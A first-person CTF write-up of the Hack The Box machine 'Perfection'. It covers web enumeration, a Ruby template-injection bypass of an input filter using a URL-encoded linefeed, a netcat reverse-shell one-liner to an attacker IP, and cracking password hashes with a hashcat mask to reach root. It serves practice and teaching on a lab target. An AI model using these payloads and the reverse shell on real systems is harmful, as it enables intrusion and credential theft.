---
title:  "Perfection"
---

# Perfection - Hack The Box

This is my first CTF write up. 
I hope you like it!

![Cover](/ctf/images/perfection/cover.png)

# Enumeration

Let's start with a basic nmap

```
nmap -sC -sV -p- <IP>
```

We discover that there is 2 open ports

![Ports](/ctf/images/perfection/ports.png)

Going on the website, we discover that there is two browsable pages. We can see that the website is "Powered by WEBrick 1.7.0" at the bottom of the page.

The two pages are :
```
http://10.129.215.133/about
http://10.129.215.133/weighted-grade
```

We launch gobuster :
```
gobuster dir -u http://10.129.215.133 -w SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
```

![gobuster](/ctf/images/perfection/gobuster_result.png)

We launch nikto and whatweb :
```
whatweb http://10.129.215.133
```
![whatweb](/ctf/images/perfection/whatweb_result.png)

whatweb reveals the ruby version.

```
nikto -h http://10.129.215.133
```
![nikto](/ctf/images/perfection/nikto_result.png)

nikto gives a lot of false positive. However, when browsing an inexisting page, we get this error message :

![error](/ctf/images/perfection/error404.png)

A search on Google didn't reveal any exploits available for WEBrick 1.7.0 or Sinatra. However, from the Sinatra documentation, we understand that Sinatra is a DSL for quickly creating web applications in Ruby with minimal effort. With that in mind, my first thought was to exploit a SSTI in Ruby.

Let's look at the calculator.

![calc](/ctf/images/perfection/calc.png)

Let's enter some random data and look at the request in Burp Suite

![calc](/ctf/images/perfection/calc1.png)

![burp](/ctf/images/perfection/burp.png)

We can see that there is a POST request to "/weighted-grade-calc"

When we try to access that webpage, we end up having the same error as when browsing an inexisting page. It's time to launch another gobuster process, but with POST as a method.

```
gobuster dir -m POST -u http://10.129.215.133 -w SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
```

Nothing came out of it.

# Initial Access

The calculator application does some kind of input filtering. It means that if we try something that is not expected as an input, the calculator will send the message "Malicious input blocked". For example, lets try to change the name of the category from "Math" to "Math{" and "Math<". Both were blocked by the calculator.

![burp](/ctf/images/perfection/burp1.png)

However, if we add "%0A", which is a linefeed URL encoded, to "Math", the calculator doesn't detect it as a malicious input. Moreover, the calculator will display the content.

![burp](/ctf/images/perfection/burp2.png)

Using HackTricks, lets try some payloads for Ruby. This payload processed and returned "49" :
```
<%= 7*7 %>
```
However, it had to be URL encoded first :
```
%3c%25%3d%20%37%2a%37%20%25%3e
```
![burp](/ctf/images/perfection/burp3.png)

Let's try a command such as "<%= `ls /` %>". Url encoded it looks like this 
```
%3c%25%3d%20%60%6c%73%20%2f%60%20%25%3e
```

It works !

![burp](/ctf/images/perfection/burp4.png)

I've set up a netcat listener
```
nc -lvnp 9001
```

Using https://www.revshells.com/, I've been able to find a reverse shell that worked for me. Before sending it it needs to be url encoded.

```
<%= `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.61 9001 >/tmp/f` %>
```

We have initial access on the machine, and the user flag is in the home directory of the user.

![shell](/ctf/images/perfection/shell.png)

# Privilege Escalation

The first thing we do is downloading linPEAS from our attacking machine to the target and run it. I like to use "/dev/shm" to store my payloads.

![priv](/ctf/images/perfection/privesc.png)

We notice that Susan is part of the "sudo" group. It means that if we can find her password, we can execute any commands as root.
We also notice that there is a cronjob that start at reboot.
We also find a readable files belonging to root and readable by me but not world readable. It is an e-mail. 
```
/var/mail/susan
```
 Now lets look at the susan home folder.
 
We find the "ruby_app" folder. Nothing can be modified inside that folder. We also find the "Migration". Inside that folder, there is a sqlite3 database file. Let's look into it.

![priv](/ctf/images/perfection/privesc1.png)

We find some hashes.

```
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

We can try to crack theses hashes using hashcat and rockyou. The attempts failed, even if we use the best64 rule. We need to dig deeper.

After digging a little bit on the target, we end up reading the email located in "/var/mail/susan"

![email](/ctf/images/perfection/email.png)

We now have a hint on how to crack the hashes with hashcat. Lets use a mask attack with the hashes that we found previously.

```
hashcat.exe -a 3 -m 1400 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d?d --increment
```

It works ! We cracked the susan hash. With the password, we can simply login as root with the "sudo su" command.

![root](/ctf/images/perfection/root.png)